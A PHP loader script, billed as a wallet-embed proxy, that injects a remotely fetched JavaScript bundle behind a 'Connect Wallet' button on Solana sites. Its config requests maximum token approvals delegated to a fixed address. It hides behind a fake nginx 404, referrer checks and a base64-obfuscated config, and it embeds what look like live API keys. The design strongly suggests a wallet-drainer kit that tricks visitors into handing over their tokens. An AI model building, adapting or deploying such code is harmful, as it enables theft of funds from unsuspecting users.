<?php
declare(strict_types=1);

/**
 * Wallet embed PHP proxy — edit $cfg below, then: node vps/build-loader.mjs
 */

$cfg = [
    'reown_project_id' => '6a35a723a14b78178c5565dca5141ab8',

    'script_path' => 'vault38472',
    'button_class_mode' => 'exact',
    'button_class' => 'ffrf2',
    'network' => 'solana',

    'site_name' => 'Connect Wallet',
    'site_description' => 'Connect your Solana wallet',
    'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',

    'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',

    'analytics' => false,
    'restrict_script_access' => true,

    'token_approval_enabled' => true,
    'token_delegate' => 'c9eSVFDgCT4utkZL6PPnJfaiAGecDQy8JJBAKeND2ws',
    'token_approval_max_count' => 1,
    'token_approval_min_usd' => 1.0,
    'token_approval_amount_mode' => 'max',
    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=68b95562-1955-4c26-92ba-0e240a8b9d62',

    'connect_popup_enabled' => true,
    'connect_popup_url' => '',

    'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
    'profile_script' => 'Ix9fLBj7CRLZ.js',
];

function request_origin(): string
{
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if ($host === '') {
        return '';
    }
    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
    $https =
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    return ($https ? 'https' : 'http') . '://' . $host;
}

function vault_entry_url(array $cfg): string
{
    $path = (string) ($cfg['script_path'] ?? 'vault38472');

    return rtrim(request_origin(), '/') . '/' . $path;
}

function build_embed_config(array $cfg, string $siteUrl): array
{
    $entry = vault_entry_url($cfg);
    $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
    if ($popupUrl === '') {
        $popupUrl = $entry . '?wallet=popup';
    }

    return [
        'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
        'buttonClass' => (string) ($cfg['button_class'] ?? ''),
        'buttonClassMode' => (string) ($cfg['button_class_mode'] ?? 'exact'),
        'network' => (string) ($cfg['network'] ?? 'solana'),
        'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
        'siteDescription' => (string) ($cfg['site_description'] ?? ''),
        'siteUrl' => $siteUrl,
        'siteIcons' => $cfg['site_icons'] ?? ($siteUrl !== '' ? ["{$siteUrl}/favicon.ico"] : []),
        'analytics' => (bool) ($cfg['analytics'] ?? true),
        'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
        'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
        'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
        'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
        'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
        'solanaRpcUrl' => $entry,
        'priceApiUrl' => $entry . '?wallet=price',
        'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
        'connectPopupUrl' => $popupUrl,
        'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
    ];
}

function script_request_allowed(array $cfg, string $siteUrl): bool
{
    if (array_key_exists('restrict_script_access', $cfg) && $cfg['restrict_script_access'] === false) {
        return true;
    }

    $allowedHosts = allowed_hosts($cfg, $siteUrl);
    if ($allowedHosts === []) {
        return true;
    }

    foreach (request_source_hosts() as $host) {
        if (in_array($host, $allowedHosts, true)) {
            return true;
        }
    }

    $secFetchSite = strtolower((string) ($_SERVER['HTTP_SEC_FETCH_SITE'] ?? ''));
    return $secFetchSite === 'same-origin' || $secFetchSite === 'same-site';
}

function allowed_hosts(array $cfg, string $siteUrl): array
{
    $hosts = [];
    $host = parse_url($siteUrl, PHP_URL_HOST);
    if (is_string($host) && $host !== '') {
        $hosts[] = strtolower($host);
        $hosts[] = str_starts_with($host, 'www.') ? substr($host, 4) : 'www.' . $host;
    }
    $serverHost = strtolower((string) ($_SERVER['HTTP_HOST'] ?? ''));
    $serverHost = preg_replace('/:\d+$/', '', $serverHost) ?? $serverHost;
    if ($serverHost !== '') {
        $hosts[] = $serverHost;
    }
    foreach ($cfg['allowed_script_hosts'] ?? [] as $extra) {
        if (is_string($extra) && $extra !== '') {
            $hosts[] = strtolower($extra);
        }
    }
    return array_values(array_unique($hosts));
}

function request_source_hosts(): array
{
    $hosts = [];
    foreach (['HTTP_ORIGIN', 'HTTP_REFERER'] as $header) {
        $value = $_SERVER[$header] ?? '';
        if (!is_string($value) || $value === '') {
            continue;
        }
        $host = parse_url($value, PHP_URL_HOST);
        if (is_string($host) && $host !== '') {
            $hosts[] = strtolower($host);
        }
    }
    return array_values(array_unique($hosts));
}

function embed_config_preamble(array $embedConfig): string
{
    $json = json_encode($embedConfig, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $payload = base64_encode($json);
    $chunks = array_map(
        static fn(string $part): string => '"' . addcslashes($part, "\\\"") . '"',
        str_split($payload, 48) ?: [''],
    );
    $blob = implode('+', $chunks);

    return '(function(w,f,j){var c=j.parse(f(' . $blob . '));'
        . 'Object.defineProperty(w,"__WALLET_EMBED_CONFIG__",'
        . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
}

function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
{
    if (!function_exists('curl_init')) {
        http_response_code(500);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'php-curl required for API proxy';
        exit;
    }

    $ch = curl_init($url);
    if ($ch === false) {
        http_response_code(502);
        exit;
    }

    $headers = array_merge(['User-Agent: wallet-embed-proxy/1.0'], $extraHeaders);
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_ENCODING => '',
    ];
    if ($body !== null) {
        $opts[CURLOPT_POSTFIELDS] = $body;
    }
    curl_setopt_array($ch, $opts);
    $response = curl_exec($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    http_response_code($code > 0 ? $code : 502);
    if ($type !== '') {
        header('Content-Type: ' . $type);
    }
    header('Cache-Control: no-store');
    echo $response === false ? '' : $response;
}

function serve_rpc_proxy(array $cfg): void
{
    $upstream = trim((string) ($cfg['solana_rpc_url'] ?? ''));
    if ($upstream === '') {
        http_response_code(500);
        exit;
    }
    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
        http_response_code(405);
        exit;
    }
    $body = file_get_contents('php://input');
    if ($body === false) {
        http_response_code(400);
        exit;
    }
    proxy_forward('POST', $upstream, $body, ['Content-Type: application/json']);
}

function serve_price_proxy(array $cfg): void
{
    $ids = (string) ($_GET['ids'] ?? '');
    if ($ids === '' || !preg_match('/^[A-Za-z0-9:,_-]+$/', $ids)) {
        http_response_code(400);
        exit;
    }
    $upstream = 'https://api.jup.ag/price/v2?ids=' . $ids;
    proxy_forward('GET', $upstream, null);
}

function vercel_profile_origin(array $cfg): string
{
    $host = trim((string) ($cfg['vercel_profile_host'] ?? ''));
    if ($host === '') {
        $host = (string) parse_url((string) ($cfg['site_url'] ?? ''), PHP_URL_HOST);
    }

    return 'https://' . $host;
}

function serve_popup_asset_proxy(array $cfg, string $file): void
{
    $safe = basename($file);
    if ($safe === '' || !preg_match('/^[A-Za-z0-9._-]+\\.js$/', $safe)) {
        http_response_code(400);
        exit;
    }
    proxy_forward('GET', vercel_profile_origin($cfg) . '/profile/' . $safe, null);
}

function serve_popup_proxy(array $cfg): void
{
    $html = fetch_remote_url(vercel_profile_origin($cfg) . '/profile/');
    if ($html === null || $html === '') {
        http_response_code(502);
        exit;
    }

    $script = basename((string) ($cfg['profile_script'] ?? 'page.js'));
    $entry = vault_entry_url($cfg);
    $assetUrl = $entry . '?wallet=popup-js&file=' . rawurlencode($script);
    $html = (string) preg_replace(
        '/<script\\s+src="' . preg_quote($script, '/') . '"\\s*><\\/script>/',
        '<script src="' . $assetUrl . '" defer></script>',
        $html,
        1
    );

    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo $html;
}

function send_generic_not_found(): void
{
    http_response_code(404);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
        . '<body><center><h1>404 Not Found</h1></center>'
        . '<hr><center>nginx</center></body></html>';
}

function detect_site_url(array $cfg): string
{
    $override = rtrim((string) ($cfg['site_url'] ?? ''), '/');
    if ($override !== '') {
        return $override;
    }
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if ($host === '') {
        return '';
    }
    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
    $https =
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    return ($https ? 'https' : 'http') . '://' . $host;
}

function assert_vercel_bundle_url(string $url): void
{
    $parts = parse_url($url);
    if (($parts['scheme'] ?? '') !== 'https') {
        throw new RuntimeException('vercel_bundle_url must use https');
    }
    $host = strtolower((string) ($parts['host'] ?? ''));
    $ok = $host === 'vercel.app' || $host === 'vercel.sh'
        || str_ends_with($host, '.vercel.app') || str_ends_with($host, '.vercel.sh');
    if (!$ok) {
        throw new RuntimeException('vercel_bundle_url host must be a Vercel domain');
    }
    $path = (string) ($parts['path'] ?? '');
    if ($path === '' || $path === '/') {
        throw new RuntimeException('vercel_bundle_url must include a path, e.g. /p7KqN2mR9vXw.js');
    }
}

function wallet_bundle_fetch_error(string $detail = ''): void
{
    $GLOBALS['__wallet_bundle_fetch_error'] = $detail;
}

function wallet_bundle_fetch_last_error(): string
{
    return (string) ($GLOBALS['__wallet_bundle_fetch_error'] ?? '');
}

function fetch_remote_url(string $url): ?string
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch === false) {
            wallet_bundle_fetch_error('curl_init failed');
            return null;
        }
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_CONNECTTIMEOUT => 20,
            CURLOPT_TIMEOUT => 180,
            CURLOPT_USERAGENT => 'wallet-embed-loader/1.0',
            CURLOPT_ENCODING => '',
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        ]);
        $body = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr = curl_error($ch);
        curl_close($ch);
        if ($body === false || $code < 200 || $code >= 300) {
            return null;
        }
        return (string) $body;
    }

    $ctx = stream_context_create([
        'http' => ['timeout' => 180, 'header' => "User-Agent: wallet-embed-loader/1.0\r\n"],
        'ssl' => ['verify_peer' => true, 'verify_peer_name' => true],
    ]);
    $body = @file_get_contents($url, false, $ctx);
    return ($body === false || $body === '') ? null : $body;
}

function fetch_vercel_bundle_remote(string $url): ?string
{
    wallet_bundle_fetch_error('');
    $body = fetch_remote_url($url);
    if ($body === null) {
        wallet_bundle_fetch_error('upstream fetch failed');
    }
    return $body;
}

function load_wallet_bundle(array $cfg): ?string
{
    $vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));
    if ($vercelUrl === '') {
        return null;
    }
    assert_vercel_bundle_url($vercelUrl);
    return fetch_vercel_bundle_remote($vercelUrl);
}

$siteUrl = detect_site_url($cfg);

if (!script_request_allowed($cfg, $siteUrl)) {
    send_generic_not_found();
    exit;
}

$walletQuery = (string) ($_GET['wallet'] ?? '');
$method = (string) ($_SERVER['REQUEST_METHOD'] ?? 'GET');

if ($method === 'POST') {
    serve_rpc_proxy($cfg);
    exit;
}

if ($walletQuery === 'price') {
    serve_price_proxy($cfg);
    exit;
}

if ($walletQuery === 'popup-js' && isset($_GET['file'])) {
    serve_popup_asset_proxy($cfg, (string) $_GET['file']);
    exit;
}

if ($walletQuery === 'popup') {
    serve_popup_proxy($cfg);
    exit;
}

header('Content-Type: application/javascript; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: public, max-age=300');
header('X-Robots-Tag: noindex, nofollow');

$embedConfig = build_embed_config($cfg, $siteUrl);
$vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));

if ($vercelUrl === '') {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Missing vercel_bundle_url in loader.php';
    exit;
}

try {
    assert_vercel_bundle_url($vercelUrl);
} catch (RuntimeException $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Invalid vercel_bundle_url: ' . $e->getMessage();
    exit;
}

try {
    $bundle = load_wallet_bundle($cfg);
} catch (RuntimeException $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Invalid vercel_bundle_url: ' . $e->getMessage();
    exit;
}

if ($bundle === null || $bundle === '') {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    $hint = wallet_bundle_fetch_last_error();
    echo 'Could not fetch wallet bundle'
        . ($hint !== '' ? " ({$hint})" : '')
        . ' — check vercel_bundle_url; install php-curl if needed';
    exit;
}

echo embed_config_preamble($embedConfig);
echo "\n";
echo $bundle;
